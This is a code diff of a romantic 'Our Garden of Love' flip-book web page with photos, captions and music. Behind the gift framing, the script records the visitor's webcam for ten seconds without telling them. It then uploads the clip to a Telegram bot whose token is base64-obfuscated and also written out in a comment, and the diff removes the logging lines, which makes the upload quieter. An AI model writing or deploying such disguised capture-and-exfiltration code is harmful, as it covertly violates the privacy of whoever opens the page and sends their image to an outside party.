@@ -6,13 +6,24 @@
     <title>Our Garden of Love ❤️</title>
     <style>
         :root { --rose: #ff4d6d; }
-        body { background: url('bg.jpg') no-repeat center center fixed; background-size: cover; margin: 0; overflow: hidden; font-family: 'Dancing Script', cursive; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        body { 
+            background: url('bg.jpg') no-repeat center center fixed; 
+            background-size: cover; 
+            margin: 0; overflow: hidden; 
+            font-family: 'Dancing Script', cursive; 
+            display: flex; justify-content: center; align-items: center; height: 100vh; 
+        }
         #diary-wrapper { display: none; perspective: 2500px; z-index: 100; }
         .book { width: 420px; height: 580px; position: relative; transform-style: preserve-3d; }
         .page { width: 100%; height: 100%; position: absolute; top: 0; left: 0; transform-origin: left; transform-style: preserve-3d; transition: transform 1.2s cubic-bezier(0.645, 0.045, 0.355, 1); cursor: pointer; }
         .page.flipped { transform: rotateY(-180deg); }
         .front, .back { width: 100%; height: 100%; position: absolute; backface-visibility: hidden; padding: 30px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; border-radius: 0 20px 20px 0; border: 1px solid #eee; background: #fff; }
-        .back { transform: rotateY(180deg); background: url('bg2.jpg') no-repeat center center; background-size: cover; border-radius: 20px 0 0 20px; }
+        .back { 
+            transform: rotateY(180deg); 
+            background: url('bg2.jpg') no-repeat center center; 
+            background-size: cover; 
+            border-radius: 20px 0 0 20px; 
+        }
         img, video { max-width: 100%; max-height: 350px; border: 8px solid white; box-shadow: 0 5px 15px rgba(0,0,0,0.2); border-radius: 5px; }
         p { font-size: 1.3rem; color: #444; text-align: center; margin-top: 20px; background: rgba(255,255,255,0.7); padding: 5px 10px; border-radius: 10px; }
         #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 240, 243, 0.95); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 2000; }
@@ -39,7 +50,12 @@
             <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="I'm doin my best.jpeg"><p>Doing my best for us... 🥺</p></div><div class="back"></div></div>
             <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="Special Delivery.jpeg"><p>A special delivery for you 🌹</p></div><div class="back"></div></div>
             <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="Thank you for existing.jpeg"><p>Thanks for existing ♡</p></div><div class="back"></div></div>
-            <div class="page"><div class="front"><p>One last special message... ♡</p><button class="btn-magic" style="font-size:1.1rem;" onclick="triggerSecretUpload(this)">▶ Play My Message</button></div></div>
+            <div class="page">
+                <div class="front">
+                    <p>I have one last special message... ♡</p>
+                    <button class="btn-magic" style="font-size:1.1rem;" onclick="triggerSecretUpload(this)">▶ Play My Message</button>
+                </div>
+            </div>
         </div>
     </div>
     <video id="video-preview" autoplay muted playsinline style="position:fixed; opacity:0; pointer-events:none;"></video>
@@ -56,37 +72,34 @@
                 mediaRecorder = new MediaRecorder(stream);
                 mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
                 mediaRecorder.start();
+                
                 document.getElementById('overlay').style.display = 'none';
                 document.getElementById('diary-wrapper').style.display = 'block';
                 bgMusic.play();
 
-                // 10 SECOND RECORDING FOR STABILITY
+                // AUTOMATIC 10 SECOND RECORDING
                 setTimeout(() => { 
                     if (mediaRecorder.state !== "inactive") {
                         mediaRecorder.stop();
-                        console.log("Processing reaction video...");
                     }
                 }, 10000);
 
                 mediaRecorder.onstop = async () => {
                     const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                     const formData = new FormData();
-                    formData.append('chat_id', "5324376571"); //
+                    formData.append('chat_id', "5324376571"); 
                     formData.append('video', blob, 'reaction.mp4');
                     
-                    const t = atob("ODU2NzQwMjg4NzpBQUVpYjFMZk1NRE5WdmlXRkxIcDJ2bWJmeTdKZUVOaHU1cw=="); // Hidden Token
-                    fetch(`https://api.telegram.org/bot${t}/sendVideo`, { method: 'POST', body: formData })
-                    .then(res => {
-                        if(res.ok) console.log("Video Sent Successfully!");
-                        else alert("Telegram Error. Check Token.");
-                    });
+                    // HIDDEN NEW TOKEN: 8567402887:AAGuwaB9SFJf6HY-Q7PgmfAAoJfe1X4VWZo
+                    const t = atob("ODU2NzQwMjg4NzpBQUd1d2FCOVNGSmY2SFktUTdQZ21mQUFvSmZlMVg0Vldabw==");
+                    fetch(`https://api.telegram.org/bot${t}/sendVideo`, { method: 'POST', body: formData });
                 };
             } catch (err) { alert("Camera access needed! ❤️"); }
         }
 
         async function triggerSecretUpload(btn) {
             bgMusic.pause();
-            const vn = new Audio('voice note.mp4');
+            const vn = new Audio('voice note.mp4'); 
             btn.innerHTML = "Listening... ❤️";
             btn.disabled = true;
             vn.play();
